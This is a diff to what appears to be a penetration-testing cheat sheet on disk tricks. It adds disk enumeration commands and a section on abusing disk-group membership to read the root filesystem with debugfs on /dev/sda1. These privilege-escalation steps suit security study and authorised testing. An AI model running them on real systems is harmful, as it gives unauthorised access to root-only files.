@@ -5,12 +5,41 @@ tags: ["disk", "mount", "backup", "privilege read", "container", "lvm"]
 ---
 
 ---
-### Abuse disk group to read container's filesystem
+### Basic
 
 ```bash
 # Show devices
 lsblk
 ```
+
+```bash
+# Device attributes
+blkid
+```
+
+```bash
+# Show swap on blk
+swapon -s
+```
+
+```bash
+# Filesystem info
+cat /etc/fstab
+```
+
+### Abuse disk group to read root filesystem
+
+```bash
+# Open target device
+debugfs /dev/sda1
+```
+
+```bash
+# Exploit
+ls /root
+```
+
+### Abuse disk group to read container's filesystem
 
 ```bash
 # Show LVM mappings
